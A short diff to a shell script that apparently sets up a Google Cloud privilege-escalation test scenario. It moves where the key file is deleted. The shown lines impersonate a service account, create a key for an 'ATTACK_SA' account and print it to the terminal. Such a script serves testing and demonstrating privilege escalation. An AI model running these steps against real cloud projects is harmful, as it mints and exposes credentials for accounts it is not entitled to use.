@@ -12,12 +12,12 @@ gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gs
   iam service-accounts keys create /tmp/privesc_check --iam-account "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
 
 cat /tmp/privesc_check
-rm /tmp/privesc_check
+
 # Cleaning
 echo "You should see a token previos to this message"
 read -p "Press any key to delete scenario... " -n1 -s
 echo ""
 
-# No deletion needed
+rm /tmp/privesc_check
 
 echo "================================================"
